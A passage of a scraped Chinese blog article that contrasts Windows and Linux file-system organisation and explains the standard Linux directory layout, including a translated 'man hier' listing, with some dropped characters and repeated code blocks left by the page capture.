Windows，怎样解读 Linux 的文件系统与目录结构？", "url": "http://blog.jobbole.com/114084/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/11/59d49abe8909a122bc2c9aa43b71e3bb.png"], "praise_nums": 1, "fav_nums": 4, "comments_nums": 0, "tags": "2,0,1,8,/,0,6,/,0,6, ,·", "content": "原文出处：吕凯Linux和Windows的文件系统有些不同，在学习使用Linux之前，若能够了解这些不同，会有助于后续学习。本文先对Windows和Linux上面文件系统原理、组织概念进行区分，并给出例子、列举两者的优缺点以具体说明，最后较为详细地介绍了Linux系统的目录结构。Windows和Linux文件系统下面将介绍启动Windows和Linux后，在文件系统的角度上，它们分别是怎样看待自己世界的。访问原理在Windows系统中，一切东西都是存放在硬盘上的。启动系统后，先确定硬盘，再确定硬盘上的分区以及每个分区所对应文件系统，最后是存放在某个分区特定的文件系统中的文件。也就是说，Windows是通过“某个硬盘-硬盘上的某个分区-分区上的特定文件系统-特定文件系统中的文件”这样的顺序来访问到一个文件的。但是与Windows不同,Linux系统中的一切都是存放在唯一的虚拟文件系统中的，这个虚拟文件系统是树状的结构以一个根目录开始。启动系统后，先有这个虚拟文件系统，再识别出各个硬盘，再把某个硬盘的某个分区挂载到这个虚拟文件系统的某个子树上（即分区用某个子目录来表示），再确定分区对应的子目录文件系统，最后的文件就存放在这个特定的文件系统中。也就是说，Linux系统是通过“虚拟文件系统-硬盘-硬盘上的分区-分区上的特定文件系统-特定文件系统中的文件”这样的顺序来访问一个文件的。可能对习惯了使用Windows的用户来说，Linux的方式有些不适应，它的虚拟文件系统，实质就是一颗目录树，最开始的目录叫做根目录，根目录中又有每一级子目录，或者文件，子目录又有子子目录和文件，其中每个子目录都特定的功能这个功能（这些是约定俗成了的，在后面常用的重要目录(Seesection1.2.1)中会详细说明）。也许有人会问，没有这个虚拟文件系统就无法使用硬盘，可是最开始没有硬盘，那么这个虚拟文件系统以及相应的组织结构是怎么存放起来的呢？这个问题，就像先有鸡还是先有蛋这个问题一样看似简单实则……但是，在Linux中，很轻易地跳出了这个思维循环，问题的答案并没在虚拟文件系统和硬盘这两者之间徘徊，而是第三者——内存，Linux系统启动起来之后，整个虚拟文件系统的组织结构，都是随着每次内核系统的启动自动在内存中建立好了的，根本就不需要硬盘。另外还要注意，就是在我们用户的角度上，无论在Windows还是Linux上面，都是使用路径来访问一个文件的。表示文件的路径由“文件所在的目录+各级目录的分隔符+文件”三个部分组成，这个策略在两者之间是一样的，所不同的是，Windows下面目录分隔符是\\，Linux下面是/，也许这也是两者之间为了表示其各自立场不同的一个原因吧？^_^系统组织在Windows系统中，我们可以把文件大体分为两种：系统文件和用户文件。一般来说系统文件（例如Windows操作系统本身，一些系统程序，程序运行所需的库文件，以及一些系统配置文件等）存放的默认位置在C盘，当然也可以在安装时候指定在其他盘；其它用户文件，包含用户后来安装的程序以及一些数据文件等，用户可以把它们随意存放在任意的分区。在Linux系统中，主要有两个概念：虚拟文件系统中的文件和Linux操作系统内核本身。逻辑上可以认为前者属于上层，后者在下层，前者基于后者，后者依赖前者而存在。Linux把除了它本身（Linux操作系统内核）以外的一切事物都看作是在虚拟文件系统中的文件了。无论是键盘，鼠标，数据，程序，CPU，内存，网卡……无论是硬件、软件、数据还是内存中的东西，我们都可以在虚拟文件系统中的相应子目录对他们进行访问和操作，操作统一。而实现这些管理的幕后就是Linux操作系统内核本身：启动Linux系统的时候，首先电脑把Linux操作系统内核加载到内存中，内核本身提供了文件管理，设备管理，内存管理，CPU进程调度管理，网络管理等功能，等内核运行起来之后，就在内存中建立起相应的虚拟文件系统，最后就是内核利用它提供的那些功能，通过管理文件的方式，来管理虚拟文件系统中的硬件软件等各种资源了。Linux把提供操作系统本身功能（管理计算机软硬件资源）的那些部分划给了Linux操作系统内核，使得Linux操作系统内核成为一个独立的部分，有它自己独立的开源代码；而其它的一切（软件应用，硬件驱动，数据）都根据其特性有自己的开源代码、或者自由地组织并且存放在那个虚拟文件系统中由Linux操作系统内核来管理。这样，将系统本身和系统所管理的资源分开，并开放源代码，有助于对系统或者系统所管理的资源进行灵活的定制和扩展，还能按需快速建立起只适合自己使用的操作系统，也利于操作系统本身的发展。实际Ubuntu，Fedora，RedHat等各种不同的Linux操作系统发行版，简单来说就是不同厂商对其文件系统和内核进行了不同的配置而产生的“大众化”的操作系统。相比之下，Windows就显得非常地零乱复杂，将系统、软件、硬件、数据都混在了一起，其不同版本只能由Microsoft一家公司发行。举例说明下面用直观的例子，来说明两者的不同，以加深理解。假设我们的机器上面有一个硬盘，硬盘分为三个区。在Windows系统中，我们启动系统之后就会看到C,D,E,盘符，它们分别对应硬盘上的三个分区，增加硬盘，或者分区，会导致盘符的增加（注意由于历史原因，A,B用于表示软驱，硬盘分区盘符从C开始按字母递增），这里的每个分区都各自可以被格式化为不同的文件系统（这里的文件系统，包括例如NTFS格式，FAT32格式等)，文件系统的基本功能就是为了存放文件的，不同文件系统区别一般在于管理其中存放的文件的功能的强弱，所以分区被格式化成指定格式的文件系统之后，就可以存放任何文件和目录了，我们看到的C,D,E内容也就对应了硬盘中相应分区的数据内容。但是，与Windows中把硬盘分区看成C,D,E盘符不同，Linux中最开始根本就没有硬盘的概念，就只有一个纯粹的虚拟文件系统。如果想要使用哪个硬盘的某个分区，就把那个分区“挂载”到某个子目录之下，这样硬盘中的分区，文件系统，目录等内容就呈现到了那个子目录里面。也就是说，在Linux中，我们使用硬盘中的数据，实际是先把硬盘的某个分区“挂载”到某个子目录下，然后通过那个子目录来访问的。这个例子中，通常硬盘会对应虚拟文件系统中的/dev/sda（如有多个硬盘，则为/dev/sda,/dev/sdb,……，按字母递增）,其三个分区对应/dev/sda1,/dev/sda2,/dev/sda3（多个分区按数字递增，不同硬盘的分区，对应为/dev/sdb1,/dev/sdb2等等）,默认硬盘各个分区会被挂载到虚拟文件系统系统中类似/mnt/sda1/,/mnt/sda2/,/mnt/sda3/的目录（在Linux又叫挂载点）中，在/etc/fstab文件中，我们可以找到分区文件和挂载点的对应关系描述。这样，硬盘相应的分区就做为整个虚拟文件系统根目录下的一颗子树，反映到了子目录（挂载点）上，子目录中的内容就对应分区中的数据。假设访问上述硬盘第三个分区dir1目录中的文件test.fileWindow系统上的路径：E:\\dir1\\test.fileLinux系统上的路径：/mnt/sda3/dir1/test.file12Window系统上的路径：E:\\dir1\\test.fileLinux系统上的路径：/mnt/sda3/dir1/test.file再有，假设用户安装和卸载一个程序firefox：Windows系统中指定或不指定安装路径类似，程序的安装目录会在C:\\ProgramFiles\\Firefox类似的目录中，或指定的安装路径中；可执行文件一般在程序的安装路径；依赖的内部库、第三方库、和系统库可能在安装路径中，也可能在C:\\Windows\\System32,或C:\\Windows\\system等类似的路径；而程序访问期间的系统和用户配置文件和产生的输入输出文件，可能会在安装路径配置中，或者在C:\\Windows\\下的某些文件中（比如注册表数据库文件、用户目录等），这就不一定了。而且不同的系统版本，应用程序版本下，这些目录的具体名称和路径可能会有所不同。卸载的时候由于不确定哪些地方安装了什么内容，很容易造成文件删除补全，遗留系统垃圾等现象，造成系统越来越瘫肿。Linux系统中如果不指定安装路径，所有程序的可执行文件在/usr/bin中，全局配置文件在/etc/firefox类似的目录，用户配置文件一般在用户主目录的.firefox的路径下(用户主目录路径名称统一格式为/home/&lt;username&gt;)，依赖的内部库和第三方库在/usr/lib,系统库在/lib下，数据文件一般就在用户主目录下。如果指定安装目录，那么所有内部库和可执行程序，全局配置文件，会在&lt;安装路径&gt;下的bin,lib,etc子目录下，其它文件一般和默认情况相同。卸载程序之时，只需在对应目录中，将可执行文件、内部库、配置文件、数据文件删除即可，基本没有不确定是否遗留垃圾文件的问题。这些都是大多数应用程序安装的和访问的默认策略，就像是不成文的业界标准，不排除有个别程序不安装这种策略部署应用，但是Linux用户带来“麻烦“的应用，早晚也会被淘汰，不可能会流行在Linux系统中，这样，自然的，好的应用都保存在Linux系统中并逐渐流行起来，还不会破坏系统结构。可见，Linux文件的存放和组织明显方式更高效，层次更分明。优缺点基于上述内容，Windows和Linux文件系统的各有优缺点分别如下。Windows系统优点优点主要是用户存放东西的位置比较自由，系统结构简单便于新用户上手。Windows系统缺点缺点较多主要有：目录组织缺乏标准由于对“系统文件”和“用户文件”存放位置缺乏细致的规定，数据组织的方式显得比较凌乱，并且两种文件之间很容易相互干扰（例如数据文件可能存放在系统区域给系统带来垃圾文件等）。用户的使用经验对系统的使用效率影响很大一般来说，我们使用Windows时候合理使用分区会提升的系统效率。例如根据需要设置合理的系统分区（假设为C分区），尽量少往C盘存放数据文件，根据具体情况可以将一些“重要并且常用的”程序安装在C分区，随时保持系统目录的清洁和大小助于提升系统的运行速度，用户安装的一般软件尽量不要安装在C盘，安装软件时候指定的位置最好采用默认标准目录名称（例如X:\\ProgramFiles目录，这里X表示盘符而不要自己定义一些奇怪名字的目录，这样便于软件的维护等等。共享不便Windows上有经验的用户们会将自己的目录结构组织好，但是每个用户组织自己内容的方式是不一样的，所以他的机器上哪里存放了什么内容，别人很难知道，为共享带来了麻烦。Linux系统缺点最开始虚拟文件系统中的每个子目录的功能是事先规定好了的，我们需要事先知道那些目录存放哪些文件，然后在相应的位置中创建自己的内容，这也是Linux系统入门门槛高的一个原因。当然，最开始的新手，也完全可以无视这一点，可以像Windows那样随意地创建目录和文件（尽管不推荐这么做）。实际上最开始的目录也不多，主要就那么几个，花不了多长时间就会明白它们的作用的，而明白这些作用之后带来的好处，远不止付出那么多（本文后面常用的重要目录(Seesection1.2.1)会着重对此进行介绍）。Linux系统优点这里只说几个优点：目录结构反映系统运行机理当我们了解了这些目录的功能之后，我们对整个Linux操作系统的运行机理也会有一个大致的了解。结构清晰避免逻辑混乱这样的目录结构，有助于我们以一种高效的方式组织自己的数据，分类清晰并且不会对系统运行有任何影响，规定了最开始每个目录的功能，并没有限制我们的自由，因为我们知道我们可以在哪里创建自己的子目录并且在子目录中任意创建自己的文件。组织规范便于共享由于目录具有统一的组织结构，所以Linux上面的用户在共享数据的时候，能够很容易地猜测出他所需要的数据大致存放在什么位置，同时也不会影响到私有数据的保密性，毕竟具体来说，怎么存放自己的私有数据，那是用户自己决定的。Linux上面的虚拟文件系统目录组织实质上，我们启动系统所看到的“根目录”，逻辑上是Linux虚拟文件系统的根目录中的一个子目录，我们看不到除了这个“根目录”以外的其他的目录，那些目录和操作系统的具体实现相关是被操作系统内核隐藏起来了的，所以这里就介绍我们所能看到的文件系统中的“根目录”的各个子目录中的作用吧。在Linux文件系统中的每一个子目录都有特定的目的和用途。一般都是根据FHS标准定义一个正式的文件系统结构的，这个标准规定了哪些目录应该哪些作用。这里我们先介绍一些日常经常用到的目录，然后给出FHS相关的内容。常用的重要目录这里，根据本人的使用经验，给出比较常见重要的一些目录，最开始我们对它们有所了解就可以了。随着对Linux使用的经验的加深，我们会了解越来越多的目录。对目录的功能知道得越多，我们对Linux系统的工p作原理就理解的越深刻，理解操作系统的工作原理，更助于我们更为规范地使用和理解系统中每个目录存在的意义，直至最后几乎知道系统中的每个文件……/根目录包含了几乎所的文件目录。相当于中央系统。进入的最简单方法是：cd/。/boot引导程序，内核等存放的目录这个目录，包括了在引导过程中所必需的文件，引导程序的相关文件（例如grub，lilo以及相应的配置文件）以及Linux操作系统内核相关文件（例如vmlinuz等）一般都存放在这里。在最开始的启动阶段，通过引导程序将内核加载到内存，完成内核的启动（这个时候，虚拟文件系统还不存在，加载的内核虽然是从硬盘读取的，但是没经过Linux的虚拟文件系统，这是比较底层的东西来实现的）。然后内核自己创建好虚拟文件系统，并且从虚拟文件系统的其他子目录中（例如/sbin和/etc）加载需要在开机启动的其他程序或者服务或者特定的动作（部分可以由用户自己在相应的目录中修改相应的文件来配制）。如果我们的机器中包含多个操作系统，那么可以通过修改这个目录中的某个配置文件（例如grub.conf）来调整启动的默认操作系统，系统启动的择菜单，以及启动延迟等参数。/sbin超级用户可以使用的命令的存放目录存放大多涉及系统管理的命令（例如引导系统的init程序），是超级权限用户root的可执行命令存放地，普通用户无权限执行这个目录下的命令（但是有时普通用户也可能会用到）。这个目录和/usr/sbin,/usr/X11R6/sbin或/usr/local/sbin等目录是相似的，我们要记住，凡是目录sbin中包含的都是root权限才能执行的，这样就行了。后面会具体区分。/bin普通用户可以使用的命令的存放目录系统所需要的那些命令位于此目录，比如ls、cp、mkdir等命令；类似的目录还/usr/bin，/usr/local/bin等等。这个目录中的文件都是可执行的、普通用户都可以使用的命令。作为基础系统所需要的最基础的命令就是放在这里。/lib根目录下的所程序的共享库目录此目录下包含系统引导和在根用户执行命令时候所必需用到的共享库。做个不太好但是比较形象的比喻，点类似于Windows上面的system32目录。按理说，这里存放的文件应该是/bin目录下程序所需要的库文件的存放地，也不排除一些例外的情况。类似的目录还/usr/lib，/usr/local/lib等等。/dev设备文件目录在Linux中设备都是以文件形式出现，这里的设备可以是硬盘，键盘，鼠标，网卡，终端，等设备，通过访问这些文件可以访问到相应的设备。设备文件可以使用mknod命令来创建，具体参见相应的命令；而为了将对这些设备文件的访问转化为对设备的访问，需要向相应的设备提供设备驱动模块（一般将设备驱动编译之后，生成的结果是一个*.ko类型的二进制文件），在内核启动之后，再通过insmod等命令加载相应的设备驱动之后，我们就可以通过设备文件来访问设备了。一般来说，想要Linux系统支持某个设备，只需要三个东西：相应的硬件设备，支持硬件的驱动模块，以及相应的设备文件。/home普通用户的家目录（或$HOME目录、主目录）在Linux机器上，用户主目录通常直接或间接地置在此目录下。其结构通常由本地机的管理员来决定。通常而言，系统的每个用户都有自己的家目录，目录以用户名作为名字存放在/home下面（例如quietheart用户，其家目录的名字为/home/quietheart）。该目录中保存了绝大多数的用户文件(用户自己的配置文件，定制文件，文档，数据等)，root用户除外（参见后面的/root目录）。由于这个目录包含了用户实际的数据，通常系统管理员为这个目录单独挂载一个独立的磁盘分区，这样这个目录的文件系统格式就可能和其他目录不一样了（尽管表面上看，这个目录还是属于根目录的一棵子树上），将系统文件和数据文件分开存放，有利于维护。/root用户root的$HOME目录系统管理员(就是root用户或超级用户)的主目录比较特殊，不存放在/home中，而是直接放在/root目录下了。/etc全局的配置文件存放目录系统和程序一般都可以通过修改相应的配置文件，来进行配置。例如，要配置系统开机的时候启动那些程序，配置某个程序启动的时候显示什么样的风格等等。通常这些配置文件都集中存放在/etc目录中，所以想要配置什么东西的话，可以在/etc下面寻找我们可能需要修改的文件。一些大型套件，如X11，在/etc下它们自己的子目录。系统配置文件可以放在这里或在/usr/etc。不过所有程序总是在/etc目录下查找所需的配置文件，你也可以将这些文件链接到目录/usr/etc。另外，还一个需要注意的常见现象就是，当某个程序在某个用户下运行的时候，可能会在该用户的家目录中生成一个配置文件（一般这个文件最开始就是/etc下相应配置文件的拷贝，存放相应于“当前用户”的配置），这样当前用户可以通过配置这个家目录的配置文件，来改变程序的行为，并且这个行为只是该用户特有的。原因就是：一般来说一个程序启动，如果需要读取一些配置文件的话，它会首先读取当前用户家目录的配置文件，如果存在就使用；如果不存在它就到/etc下读取全局的配置文件进而启动程序。就是这个配置文件不自动生成，我们手动在自己的家目录中创建一个文件的话，也有许多程序会首先读取到这个家目录的文件并且以它的配置作为启动的选项（例如我们可以在家目录中创建vim程序的配置文件.vimrc，来配置自己的vim程序）。/usr这个目录中包含了命令库文件和在通常操作中不会修改的文件这个目录对于系统来说也是一个非常重要的目录，其地位类似Windows上面的ProgramFiles目录（请原谅我可能这样做比较不太恰当^_^）。安装程序的时候，默认就是安装在此文件内部某个子文件夹内。输入命令后系统默认执行/usr/bin下的程序（当然，前提是这个目录的路径已经被添加到了系统的环境变量中）。此目录通常也会挂载一个独立的磁盘分区，它应保存共享只读类文件，这样它可以被运行Linux的不同主机挂载。/usr/lib目标库文件，包括动态连接库加上一些通常不是直接调用的可执行文件的存放位置这个目录功能类似/lib目录，理说，这里存放的文件应该是/bin目录下程序所需要的库文件的存放地，也不排除一些例外的情况。/usr/bin一般使用者使用并且不是系统自检等所必需可执行文件的目录此目录相当于根文件系统下的对应目录（/bin），非启动系统，非修复系统以及非本地安装的程序一般都放在此目录下。/usr/sbin管理员使用的非系统必须的可执行文件存放目录此目录相当于根文件系统下的对应目录（/sbin），保存系统管理程序的二进制文件，并且这些文件不是系统启动或文件系统挂载/usr目录或修复系统所必需的。/usr/share存放共享文件的目录在此目录下不同的子目录中保存了同一个操作系统在不同构架下工作时特定应用程序的共享数据(例如程序文档信息)。使用者可以找到通常放在/usr/doc或/usr/lib或/usr/man目录下的这些类似数据。/usr/includeC程序语言编译使用的头文件Linux下开发和编译应用程序所需要的头文件一般都存放在这里，通过头文件来使用某些库函数。默认来说这个路径被添加到了环境变量中，这样编译开发程序的时候编译器会自动搜索这个路径，从中找到你的程序中可能包含的头文件。/usr/local安装本地程序的一般默认路径当我们下载一个程序源代码，编译并且安装的时候，如果不特别指定安装的程序路径，那么默认会将程序相关的文件安装到这个目录的对应目录下。例如，安装的程序可执行文件被安装（安装实质就是复制）到了/usr/local/bin下面，此程序（可执行文件）所需要依赖的库文件被安装到了/usr/local/lib目录下，被安装的软件如果是某个开发库（例如Qt，Gtk等）那么相应的头文件可能就被安装到了/usr/local/include中等等。也就是说，这个目录存放的内容，一般都是我们后来自己安装的软件的默认路径，如果择了这个默认路径作为软件的安装路径，被安装的软件的所文件都限制在这个目录中，其中的子目录就相应于根目录的子目录。/proc特殊文件目录这个目录采用一种特殊的文件系统格式（proc格式），内核支持这种格式。其中包含了全部虚拟文件。它们并不保存在磁盘中，也不占据磁盘空间(尽管命令ls-c会显示它们的大小)。当您查看它们时，您实际上看到的是内存里的信息，这些文件助于我们了解系统内部信息。例如：├1/关于进程1的信息目录。每个进程在/proc下一个名为其进程号的目录。├cpuinfo处理器信息，如类型、制造商、型号和性能。├devices当前运行的核心配置的设备驱动的列表。├dma显示当前使用的DMA通道。├filesystems核心配置的文件系统。├interrupts显示使用的中断，andhowmanyofeachtherehavebeen.├ioports当前使用的I/O端口。├kcore系统物理内存映象。与物理内存大小一样，但实际不占这么多内存；├kmsg核心输出的消息。也被送到syslog。├ksyms核心符号表。├loadavg系统”平均负载”；3个没意义的指示器指出系统当前的工作量。├meminfo存储器使用信息，包括物理内存和swap。├modules当前加载了哪些核心模块。├net网络协议状态信息。├self到查看/proc的程序的进程目录的符号连接。├stat系统的不同状态├uptime系统启动的时间长度。└version核心版本。123456789101112131415161718├1/关于进程1的信息目录。每个进程在/proc下一个名为其进程号的目录。├cpuinfo处理器信息，如类型、制造商、型号和性能。├devices当前运行的核心配置的设备驱动的列表。├dma显示当前使用的DMA通道。├filesystems核心配置的文件系统。├interrupts显示使用的中断，andhowmanyofeachtherehavebeen.├ioports当前使用的I/O端口。├kcore系统物理内存映象。与物理内存大小一样，但实际不占这么多内存；├kmsg核心输出的消息。也被送到syslog。├ksyms核心符号表。├loadavg系统”平均负载”；3个没意义的指示器指出系统当前的工作量。├meminfo存储器使用信息，包括物理内存和swap。├modules当前加载了哪些核心模块。├net网络协议状态信息。├self到查看/proc的程序的进程目录的符号连接。├stat系统的不同状态├uptime系统启动的时间长度。└version核心版本。/opt可择的文件目录这个目录表示的是可择的意思，些自定义软件包或者第方工具，就可以安装在这里。比如在FedoraCore5.0中，OpenOffice就是安装在这里。些我们自己编译的软件包，就可以安装在这个目录中；通过源码包安装的软件，可以把它们的安装路径设置成/opt这样来安装。这个目录的作用一点类似/usr/local。/mnt临时挂载目录这个目录一般是用于存放挂载储存设备的挂载目录的，比如磁盘，光驱，网络文件系统等，当我们需要挂载某个磁盘设备的时候，可以把磁盘设备挂载到这个目录上去，这样我们可以直接通过访问这个目录来访问那个磁盘了。一般来说，我们最好在/mnt目录下面多建立几个子目录，挂载的时候挂载到这些子目录上面，因为通常我们可能不仅仅是挂载一个设备吧?/media挂载的媒体设备目录挂载的媒体设备目录，一般外部设备挂载到这里，例如cdrom等。比如我们插入一个U盘，我们一般会发现，Linux自动在这个目录下建立一个disk目录，然后把U盘挂载到这个disk目录上，通过访问这个disk来访问U盘。/var内容经常变化的目录此目录下文件的大小可能会改变，如缓冲文件，日志文件，缓存文件，等一般都存放在这里。/tmp临时文件目录该目录存放系统中的一些临时文件，文件可能会被系统自动清空。的系统直接把tmpfs类型的文件系统挂载到这个目录上，tmpfs文件系统由Linux内核支持，在这个文件系统中的数据，实际上是内存中的，由于内存的数据断电易失，当系统重新启动的时候我们就会发现这个目录被清空了。/lost+found恢复文件存放的位置当系统崩溃的时候，在系统修复过程中需要恢复的文件，可能就会在这里被找到了，这个目录一般为空。以上目录，是最常见的重要目录。其中，有些目录初学者容易混淆，这里简单区分一下：/bin,/sbin与/usr/bin,/usr/sbin/bin一般存放对于用户和系统来说“必须”的程序（二进制文件）。/sbin一般存放用于系统管理的“必需”的程序（二进制文件），一般普通用户不会使用，根用户使用。/usr/bin一般存放的只是对用户和系统来说“不是必需的”程序（二进制文件）。/usr/sbin一般存放用于系统管理的系统管理的不是必需的程序（二进制文件）。/lib与/usr/lib/lib和/usr/lib的区别类似/bin,/sbin与/usr/bin,/usr/sbin。/lib一般存放对于用户和系统来说“必须”的库（二进制文件）。/usr/lib一般存放的只是对用户和系统来说“不是必需的”库（二进制文件）。其他还一些目录例如：/home/user/bin,/home/user/opt,/home/user/etc,/usr/local/etc等等，其作用都是类似于/etc,/bin等目录的，可能只是层次概念不同了，使用Linux时间长了，会逐渐体会到其中的含义。当然，我们可以无视这些目录，像使用Windows那样自由的，不管啥文件，想往哪存就往哪存，还是那句话，使用Linux时间长了，会逐渐体会到其中的含义，到时候也许我们想要乱来都不行了呢。^_^对文件系统目录的分类标准在大多数Linux系统上面，我们可以使用一个命令：manhier，通过这个命令的输出，就知道“根目录”中所子目录的作用了。这个命令含义我不多说了，总之这里的hier就是对Linux文件系统中各级目录的标准功能，是一个大家都约定俗成了的东西。想要了解每个目录更详细的信息，需要仔细参考manhier的输出。下面就是一个比较简短的中文描述的对文件系统目录分类的FHS标准，也就是对manhier的简单翻译。NAME名称hier-文件系统描述DESCRIPTION描述一个典型的Linux系统具以下几个目录结构：/根目录，是所目录树开始的地方。/bin此目录下包括了单用户方式及系统启动或修复所用到的所执行程序。/boot包括了引导程序的静态文件。此目录下包括了在引导过程中所必需的文件。系统装载程序及配制文件在/sbin和/etc目录中找到。/dev对应物理设备的指定文件或驱动程序。参见mknod(1)。/dos如果MS-DOS和Linux共存于一台计算机时，这里通常用于存放DOS文件系统。/etc用于存放本地机的配置文件。一些大型套件，如X11，在/etc下它们自己的子目录。系统配置文件可以放在这里或在/usr/etc。不过所程序总是在/etc目录下查找所需的配置文件，你也可以将这些文件链接到目录/usr/etc./etc/skel当建立一个新用户账号时，此目录下的文件通常被复制到用户的主目录下。/etc/X11X11windowsystem所需的配置文件。/home在Linux机器上，用户主目录通常直接或间接地置在此目录下。其结构通常由本地机的管理员来决定。/lib此目录下包含系统引导和在根用户执行命令所必需用到的共享库。/mnt挂载临时文件系统的挂载点。/proc这是提供运行过程和核心文件系统proc挂载点。这一”伪”文件系统在以下章节中详细叙述proc(5)。/sbin类似于/bin此目录保存了系统引导所需的命令，但这些命令一般使用者不能执行。/tmp此目录用于保存临时文件，临时文件在日常维护或在系统启动时无需通知便可删除/usr此目录通常用于从一个独立的分区上挂载文件。它应保存共享只读类文件，这样它可以被运行Linux的不同主机挂载。/usr/X11R6X-Window系统Version11release6./usr/X11R6/binX-Windows系统使用的二进制文件；通常是在对更传统的/usr/bin/X11中文件的符号连接。/usr/X11R6/lib保存与X-Windows系统关数据文件。/usr/X11R6/lib/X11此目录保存与运行X-Windows系统关其他文件。通常是对来自/usr/lib/X11中文件的符号连接。/usr/X11R6/include/X11此目录保存包括使用X11窗口系统进行编译程序所需的文件。通常是对来自/usr/lib/X11中文件的符号连接。/usr/bin这是执行程序的主要目录，其中的绝大多数为一般使用者使用，除了那些启动系统或修复系统或不是本地安装的程序一般都放在此目录下。/usr/bin/X11X11执行文件放置的地方；在Linux系统中，它通常是对/usr/X11R6/bin.符号连接表/usr/dict此目录保存拼写检查器所使用的词汇表文件。/usr/doc此目录下应可以找到那些已安装的软件文件。/usr/etc此目录可用来那些存放整个网共享的配置文件。然而那可执行命令指向总是使用参照使用/etc目录下的文件。/etc目录下连接文件应指向/usr/etc.目录下适当的文件。/usr/includeC程序语言编译使用的Include”包括”文件。/usr/include/X11C程序语言编译和X-Windows系统使用的Include”包括”文件。它通常中指向/usr/X11R6/include/X11.符号连接表。/usr/include/asm申明汇编函数的Include”包括”文件，它通常是指向/usr/src/linux/include/asm目录的符号连接/usr/include/linux包含系统变更的信息通常是指向/usr/src/linux/include/linux目录的符号连接表，来获得操作系统特定信息。(注：使用者应在此自行包含那些保证自己开发的程序正常运行所需的libc函数库。不管怎样，Linux核心系统不是设计用来执行直接运行用户程序的，它并不知道用户程序需要使用哪个版本的libc库。如果你随意将/usr/include/asm和/usr/include/linux指向一个系统核心，系统很可能崩溃。Debian系统不这么做。它使用libc*-dev运行包中提供的核心系统标识，以保证启动所正确的文件。)/usr/include/g++GNUC++编译程序所使用的Include”包括”文件。/usr/lib目标库文件，包括动态连接库加上一些通常不是直接调用的可执行文件案。一些复杂的程序可能在此占用整个子目录。/usr/lib/X11存放X系统数据文件及系统配置文件的地方。Linux中通常是指向/usr/X11R6/lib/X11目录的符号连接表。/usr/lib/gcc-libGNUC编译程序所使用的可执行文件案和”包括”文件。gcc(1)./usr/lib/groffGNUgroff文件格式系统所使用的文件。/usr/lib/uucpuucp(1)所使用的文件。/usr/lib/zoneinfo关时区信息文件文件。/usr/local安装在本地执行程序的地方。/usr/local/bin在此地放置本地执行程序的二进制文件。/usr/local/doc放置本地文件。/usr/local/etc安装在本地程序的配置文件。/usr/local/lib安装在本地程序的库文件。/usr/local/info安装在本地程序关信息文件。/usr/local/man安装在本地程序使用手册。/usr/local/sbin安装在本地的系统管理程序。/usr/local/src安装在本地程序的原始码。/usr/man手册页通常放在此目录，或相关子目录下。/usr/man//man[1-9]此目录在指定的地方以原始码形式存放手册页。系统在所的手册页中使用自己独特的语言及代码集，可能会省略substring子字符串。/usr/sbin此目录保存系统管理程序的二进制码，这些文件不是系统启动或文件系统挂载/usr目录或修复系统所必需的。/usr/share在此目录下不同的子目录中保存了同一个操作系统在不同构架下工作时特定应用程序的共享数据。使用者可以找到通常放在/usr/doc或/usr/lib或/usr/man目录下的这些数据。/usr/src系统不同组成部份的源文件包括参考数据报。不要将你自己与项目关的文件放这里，因为在安装软件外，/usr下的文件属性除通常设为只读。/usr/src/linux系统核心资源通常拆包安装于此。这是系统中重要的一环，因为/usr/include/linux符号连接表指向此目录。你应当使用其他目录来来编译建立新核心。/usr/tmp此目录不再使用了。它应指向目录/var/tmp。这个链接只是出于系统兼容的目的，一般不再使用。/var此目录下文件的大小可能会改变，如缓冲文件可日志文件。/var/adm此目录为/var/log甩替代，通常是指向/var/log的符号连接表。/var/backups此目录用来存放重要系统文件的后备文件/var/catman/cat[1-9]or/var/cache/man/cat[1-9]此目录存储根据手册分类预先格式化的参考手册页。(这些参考手册页是相互独立的)/var/lock此目录存储锁定文件。依据命名习惯，设备锁定文件是LCKxxxxxxxxxx与在文件系统中该设备名相同，使用的格式是HDUUUCP锁定文件，例如包含进程标识PID的锁定文件是一个10字节的ASCII格式的数字，后面跟一个换行符。/var/log各种日志文件。/var/preserve这是vi(1)存放正在编辑中的文件，以便以后可以恢复。/var/run运行时的变量文件，如存放进程标识和登入使用者信息的文件。(utmp)此目录下文件在系统启动时被自动清除。/var/spool各种程序产生的缓冲或排除等待的文件/var/spool/atat(1)的作业存缓区/var/spool/croncron(1)的作业存缓区/var/spool/lpd打印缓存文件。/var/spool/mail使用者邮箱。/var/spool/smail存放smail(1)邮件发送程序的缓冲文件。/var/spool/news新闻子系统的缓冲目录/var/spool/uucpuucp(1)的缓冲文件/var/tmp类似/tmp,此目录保存未指定持续时间的临时文件。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121NAME名称hier-文件系统描述DESCRIPTION描述一个典型的Linux系统具以下几个目录结构：/根目录，是所目录树开始的地方。/bin此目录下包括了单用户方式及系统启动或修复所用到的所执行程序。/boot包括了引导程序的静态文件。此目录下包括了在引导过程中所必需的文件。系统装载程序及配制文件在/sbin和/etc目录中找到。/dev对应物理设备的指定文件或驱动程序。参见mknod(1)。/dos如果MS-DOS和Linux共存于一台计算机时，这里通常用于存放DOS文件系统。/etc用于存放本地机的配置文件。一些大型套件，如X11，在/etc下它们自己的子目录。系统配置文件可以放在这里或在/usr/etc。不过所程序总是在/etc目录下查找所需的配置文件，你也可以将这些文件链接到目录/usr/etc./etc/skel当建立一个新用户账号时，此目录下的文件通常被复制到用户的主目录下。/etc/X11X11windowsystem所需的配置文件。/home在Linux机器上，用户主目录通常直接或间接地置在此目录下。其结构通常由本地机的管理员来决定。/lib此目录下包含系统引导和在根用户执行命令所必需用到的共享库。/mnt挂载临时文件系统的挂载点。/proc这是提供运行过程和核心文件系统proc挂载点。这一”伪”文件系统在以下章节中详细叙述proc(5)。/sbin类似于/bin此目录保存了系统引导所需的命令，但这些命令一般使用者不能执行。/tmp此目录用于保存临时文件，临时文件在日常维护或在系统启动时无需通知便可删除/usr此目录通常用于从一个独立的分区上挂载文件。它应保存共享只读类文件，这样它可以被运行Linux的不同主机挂载。/usr/X11R6X-Window系统Version11release6./usr/X11R6/binX-Windows系统使用的二进制文件；通常是在对更传统的/usr/bin/X11中文件的符号连接。/usr/X11R6/lib保存与X-Windows系统关数据文件。/usr/X11R6/lib/X11此目录保存与运行X-Windows系统关其他文件。通常是对来自/usr/lib/X11中文件的符号连接。/usr/X11R6/include/X11此目录保存包括使用X11窗口系统进